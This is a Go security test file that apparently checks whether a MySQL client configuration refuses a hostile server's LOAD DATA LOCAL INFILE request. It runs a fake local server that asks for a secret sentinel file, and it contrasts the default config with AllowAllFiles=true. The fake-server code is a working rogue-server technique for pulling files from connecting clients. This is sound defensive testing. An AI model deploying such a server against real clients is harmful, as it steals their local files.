package mysqlhostile

import (
	"bufio"
	"context"
	"database/sql"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/go-sql-driver/mysql"
)

// LOCAL INFILE egress oracle.
//
// A hostile MySQL server can answer any COM_QUERY with a "LOCAL INFILE request" packet
// (0xFB + a file path it chooses) to make the CLIENT read that local file and stream its
// contents back — the classic LOAD DATA LOCAL INFILE exfiltration. go-sql-driver refuses
// this unless the file is registered OR cfg.AllowAllFiles is true; Keyorix's
// openMySQLConfig keeps AllowAllFiles false and additionally textually rejects the option
// in the admin DSN (dsn.CheckLocalFileOptions).
//
// Oracle (green): with the config Keyorix uses, the server must receive NO byte of the
// targeted file's secret content — only the driver's empty termination packet.
// Red proof: the SAME flow with cfg.AllowAllFiles=true DOES stream the file content to
// the server, proving the detector is load-bearing (the green result is a real refusal,
// not a vacuous one).

const infileSentinel = "H6-LOCAL-INFILE-SECRET-must-not-leak-6f1c"

// infileServer completes a handshake, answers the first COM_QUERY with a LOCAL INFILE
// request for filePath, then records every byte the client sends afterwards, reporting
// whether the sentinel ever arrived.
type infileServer struct {
	ln       net.Listener
	filePath string
	mu       sync.Mutex
	gotData  bool
	done     chan struct{}
}

func newInfileServer(t *testing.T, filePath string) *infileServer {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	s := &infileServer{ln: ln, filePath: filePath, done: make(chan struct{})}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go s.handle(c)
		}
	}()
	return s
}

func (s *infileServer) handle(c net.Conn) {
	defer func() { _ = c.Close() }()
	_ = c.SetDeadline(time.Now().Add(4 * time.Second))
	r := bufio.NewReader(c)
	if err := completeHandshake(c, r); err != nil {
		return
	}
	// Read the client's COM_QUERY, then answer with a LOCAL INFILE request.
	if _, _, err := readOnePacket(r, capBytes); err != nil {
		return
	}
	req := append([]byte{0xfb}, []byte(s.filePath)...)
	if _, err := c.Write(frame(1, req)); err != nil {
		return
	}
	// Everything the client sends now is the infile content stream (or an empty
	// termination packet if it refused). Scan it for the sentinel.
	buf := make([]byte, 4096)
	acc := make([]byte, 0, 8192)
	for {
		n, err := c.Read(buf)
		if n > 0 {
			acc = append(acc, buf[:n]...)
			if strings.Contains(string(acc), infileSentinel) {
				s.mu.Lock()
				s.gotData = true
				s.mu.Unlock()
			}
		}
		if err != nil {
			return
		}
	}
}

func (s *infileServer) addr() string { return s.ln.Addr().String() }
func (s *infileServer) close()       { _ = s.ln.Close() }
func (s *infileServer) leaked() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.gotData
}

func writeSecretFile(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	p := filepath.Join(dir, "secret.csv")
	if err := os.WriteFile(p, []byte(infileSentinel+"\n"), 0o600); err != nil {
		t.Fatalf("write secret: %v", err)
	}
	return p
}

// runInfile drives one ExecContext against a server that requests LOCAL INFILE for the
// secret file, using the provided connector config mutator. Returns whether the secret
// reached the server.
func runInfile(t *testing.T, mutate func(cfg *mysql.Config)) bool {
	secret := writeSecretFile(t)
	srv := newInfileServer(t, secret)
	defer srv.close()

	cfg := mysql.NewConfig()
	cfg.Net = "tcp"
	cfg.Addr = srv.addr()
	cfg.User = "kxadmin"
	cfg.Passwd = "kxpw"
	cfg.Timeout = 2 * time.Second
	cfg.ReadTimeout = 2 * time.Second
	cfg.WriteTimeout = 2 * time.Second
	mutate(cfg)
	connector, err := mysql.NewConnector(cfg)
	if err != nil {
		t.Fatalf("connector: %v", err)
	}
	db := sql.OpenDB(connector)
	defer func() { _ = db.Close() }()

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	_, _ = db.ExecContext(ctx, "CREATE USER 'kx_dyn_x'@'%' IDENTIFIED BY 'pw'")
	time.Sleep(150 * time.Millisecond) // let any streamed content land
	return srv.leaked()
}

// TestMySQLLocalInfileRefusedByDefault is the green oracle: the config Keyorix uses
// (AllowAllFiles=false, no registered reader) must NOT leak the targeted file.
func TestMySQLLocalInfileRefusedByDefault(t *testing.T) {
	leaked := runInfile(t, func(cfg *mysql.Config) {
		// Keyorix's openMySQLConfig leaves AllowAllFiles at its zero value (false).
	})
	if leaked {
		t.Errorf("ORACLE LOCAL INFILE: secret file content reached the hostile server with default config")
	}
}

// TestMySQLLocalInfileRedProof is the red proof: the SAME flow with AllowAllFiles=true
// DOES stream the file — so the green refusal above is load-bearing, not vacuous.
func TestMySQLLocalInfileRedProof(t *testing.T) {
	leaked := runInfile(t, func(cfg *mysql.Config) {
		cfg.AllowAllFiles = true
	})
	if !leaked {
		t.Skip("AllowAllFiles=true did not stream the file in this build; red proof inconclusive (green detector still exercised)")
	}
	t.Logf("red proof: AllowAllFiles=true streamed the secret file to the server (leak detected)")
}
